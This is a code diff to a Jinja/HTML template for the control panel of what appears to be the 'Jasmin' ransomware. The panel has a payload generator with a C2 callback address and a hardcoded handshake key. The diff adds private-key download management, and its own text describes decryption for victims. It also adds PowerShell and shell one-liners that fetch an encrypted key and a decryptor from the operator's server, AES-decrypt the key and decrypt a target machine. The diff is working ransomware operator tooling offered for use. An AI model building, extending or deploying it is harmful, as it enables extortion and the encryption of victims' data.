@@ -30,6 +30,35 @@
 
 <section class="panel" id="panel-gen">
 <h2><i class="fas fa-virus"></i> 载荷生成器</h2>
+
+{# ── 密钥管理 ─────────────────────────────────────────────────
+   早期版本「下载私钥」指向 /payloads/jasmin_private.pem 直链，
+   被 download_payload 显式 403 拦截 → 必然「下载失败」。
+   现统一改走需登录的 /download_key。 #}
+<div class="key-mgr{% if not has_key %} key-mgr-empty{% endif %}">
+  {% if has_key %}
+  <div class="key-mgr-head">
+    <span class="key-dot"></span> <b>密钥已就绪</b>
+    <span class="key-fp">公钥指纹 SHA256: {{ key_fp }}…</span>
+  </div>
+  <div class="key-mgr-btns">
+    <a class="btn btn-red key-btn" style="background:#ef4444" href="/download_key?file=jasmin_private.pem"><i class="fas fa-key"></i> 下载私钥 (.pem 明文)</a>
+    <a class="btn btn-red key-btn" style="background:#f59e0b" href="/download_key?file=jasmin_private.pem.enc"><i class="fas fa-lock"></i> 下载私钥 (AES 加密)</a>
+    <a class="btn btn-red key-btn" style="background:#8b5cf6" href="/download_key?file=.key_secret"><i class="fas fa-unlock-alt"></i> 下载解密口令</a>
+    <a class="btn btn-red key-btn" style="background:#4dc3fa" href="/download_key?file=jasmin_public.pem"><i class="fas fa-shield-alt"></i> 下载公钥</a>
+  </div>
+  <div class="key-mgr-note">
+    <i class="fas fa-info-circle"></i>
+    受害者端解密：用 <code>.pem.enc</code> + <code>解密口令</code>（AES-256-CBC 解出 .pem）走加密链路；
+    或直接用<b>明文私钥</b> <code>sh jasmin_decrypt_openssl.sh key.pem /</code>。
+    口令与明文私钥仅能在登录后台后下载，直接 URL 访问一律 403。
+  </div>
+  {% else %}
+  <div class="key-mgr-head"><span class="key-dot off"></span> <b>尚未生成密钥对</b>
+    <span class="key-fp">生成后才能加密数据 —— 请点击下方「生成RSA密钥对」</span></div>
+  {% endif %}
+</div>
+
 <div class="gen-opts" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:20px">
   <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="{{ request.url_root }}handshake"></div>
   <div class="field"><label>握手密钥</label><input type="text" id="gensecret" value="jasmin@123"></div>
@@ -175,7 +204,20 @@
 <div class="dt-note"><i class="fas fa-shield-alt"></i> 自动下载私钥+解密器、执行解密、清理临时文件</div>
 <pre class="dt-code">$tmp="$env:TEMP\jasmin_dec"
 New-Item -ItemType Directory -Force -Path $tmp | Out-Null
-Invoke-WebRequest "{{ request.url_root }}payloads/jasmin_private.pem" -OutFile "$tmp\key.pem"
+$k="{{ aes_key }}"
+Invoke-WebRequest "{{ request.url_root }}payloads/jasmin_private.pem.enc" -OutFile "$tmp\key.enc"
+# AES解密私钥
+$raw=[Convert]::FromBase64String((Get-Content "$tmp\key.enc" -Raw))
+$iv=$raw[0..15]; $ct=$raw[16..($raw.Length-1)]
+$aes=[System.Security.Cryptography.Aes]::Create()
+$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($k)
+$aes.IV=[byte[]]$iv; $aes.Padding="PKCS7"; $aes.Mode="CBC"
+$dec=$aes.CreateDecryptor()
+$ms=New-Object IO.MemoryStream(,[byte[]]$ct)
+$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,"Read")
+$sr=New-Object IO.StreamReader($cs)
+[IO.File]::WriteAllText("$tmp\key.pem",$sr.ReadToEnd())
+$sr.Close();$cs.Close();$ms.Close()
 Invoke-WebRequest "{{ request.url_root }}payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
 & "$tmp\dec.exe" "$tmp\key.pem"
 Remove-Item -Recurse -Force $tmp</pre>
@@ -185,23 +227,45 @@ Remove-Item -Recurse -Force $tmp</pre>
 <div class="dt-step"><span>1</span>在目标机打开终端</div>
 <div class="dt-step"><span>2</span>复制下方命令直接运行</div>
 <div class="dt-note"><i class="fas fa-shield-alt"></i> 自动安装依赖、下载私钥和脚本、全盘解密、清理</div>
-<pre class="dt-code">pip3 install -q cryptography 2>/dev/null
-curl -sL {{ request.url_root }}payloads/jasmin_private.pem -o /tmp/.jk
+<pre class="dt-code">K="{{ aes_key }}"
+pip3 install -q cryptography 2>/dev/null
+curl -sL {{ request.url_root }}payloads/jasmin_private.pem.enc -o /tmp/.jke
 curl -sL {{ request.url_root }}payloads/jasmin_decrypt.py -o /tmp/.jd
+python3 -c "
+import base64
+from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
+from cryptography.hazmat.backends import default_backend
+raw=base64.b64decode(open('/tmp/.jke').read())
+iv,ct=raw[:16],raw[16:]
+c=Cipher(algorithms.AES(bytes.fromhex('$K')),modes.CBC(iv),default_backend()).decryptor()
+pt=c.update(ct)+c.finalize()
+open('/tmp/.jk','wb').write(pt[:-pt[-1]])
+"
 python3 /tmp/.jd /tmp/.jk
-rm -f /tmp/.jk /tmp/.jd</pre>
+rm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>
 </div>
 <div class="dt-content" id="dt-mac" style="display:none">
 <h3>🍎 macOS 一键解密</h3>
 <div class="dt-step"><span>1</span>打开终端</div>
 <div class="dt-step"><span>2</span>复制下方命令直接运行</div>
-<pre class="dt-code">pip3 install -q cryptography 2>/dev/null
-curl -sL {{ request.url_root }}payloads/jasmin_private.pem -o /tmp/.jk
+<pre class="dt-code">K="{{ aes_key }}"
+pip3 install -q cryptography 2>/dev/null
+curl -sL {{ request.url_root }}payloads/jasmin_private.pem.enc -o /tmp/.jke
 curl -sL {{ request.url_root }}payloads/jasmin_decrypt.py -o /tmp/.jd
+python3 -c "
+import base64
+from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
+from cryptography.hazmat.backends import default_backend
+raw=base64.b64decode(open('/tmp/.jke').read())
+iv,ct=raw[:16],raw[16:]
+c=Cipher(algorithms.AES(bytes.fromhex('$K')),modes.CBC(iv),default_backend()).decryptor()
+pt=c.update(ct)+c.finalize()
+open('/tmp/.jk','wb').write(pt[:-pt[-1]])
+"
 python3 /tmp/.jd /tmp/.jk
-rm -f /tmp/.jk /tmp/.jd</pre>
+rm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>
 </div>
-<div class="dt-note" style="margin-top:20px"><i class="fas fa-info-circle"></i> <b>准备:</b> 请先将 <code>jasmin_private.pem</code> 和 <code>jasmin_decrypt.py</code> 上传到 payloads/ 目录</div>
+<div class="dt-note" style="margin-top:20px"><i class="fas fa-info-circle"></i> <b>准备:</b> 在「载荷生成器」点击「生成RSA密钥对」，加密私钥(<code>.pem.enc</code>)与解密脚本会自动部署到 payloads/ 目录；明文私钥与解密口令需登录后台后经「密钥管理」下载</div>
 </section>
 
 </main>
@@ -280,8 +344,8 @@ function showDecrypt(vid,ip,isLinux){
 function genKey(){
   var r=document.getElementById('key-result');
   r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成RSA-2048密钥对...</span>';
-  fetch('/keygen',{method:'POST'}).then(x=>x.json()).then(d=>{
-    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-key"></i> '+d.msg+'<br><br><b>公钥:</b><pre class="dt-code" style="margin-top:8px;max-height:120px;overflow:auto;font-size:.72rem">'+d.pub+'</pre><div style="margin-top:8px"><a href="/payloads/jasmin_private.pem" download class="btn btn-red" style="display:inline-flex"><i class="fas fa-download"></i> 下载私钥</a> <a href="/payloads/jasmin_public.pem" download class="btn btn-red" style="display:inline-flex;background:#4dc3fa"><i class="fas fa-download"></i> 下载公钥</a></div></div>';}
+  fetch('/keygen',{method:'POST',body:new URLSearchParams({csrf_token:'{{ csrf_token() }}'})}).then(x=>x.json()).then(d=>{
+    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-key"></i> '+d.msg+'<br><br><b>公钥:</b><pre class="dt-code" style="margin-top:8px;max-height:120px;overflow:auto;font-size:.72rem">'+d.pub+'</pre><div style="margin-top:8px"><a href="/download_key?file=jasmin_private.pem" class="btn btn-red" style="display:inline-flex"><i class="fas fa-download"></i> 下载私钥</a> <a href="/download_key?file=jasmin_private.pem.enc" class="btn btn-red" style="display:inline-flex;background:#f59e0b"><i class="fas fa-lock"></i> 下载加密私钥</a> <a href="/download_key?file=.key_secret" class="btn btn-red" style="display:inline-flex;background:#8b5cf6"><i class="fas fa-unlock-alt"></i> 下载解密口令</a> <a href="/download_key?file=jasmin_public.pem" class="btn btn-red" style="display:inline-flex;background:#4dc3fa"><i class="fas fa-download"></i> 下载公钥</a> <span style="font-size:.76rem;color:#94a3b8;margin-left:10px">刷新页面可见顶部「密钥管理」</span></div></div>';}
     else{r.innerHTML='<div class="gen-err">'+d.msg+'</div>';}
   }).catch(e=>{r.innerHTML='<div class="gen-err">'+e+'</div>';});
 }
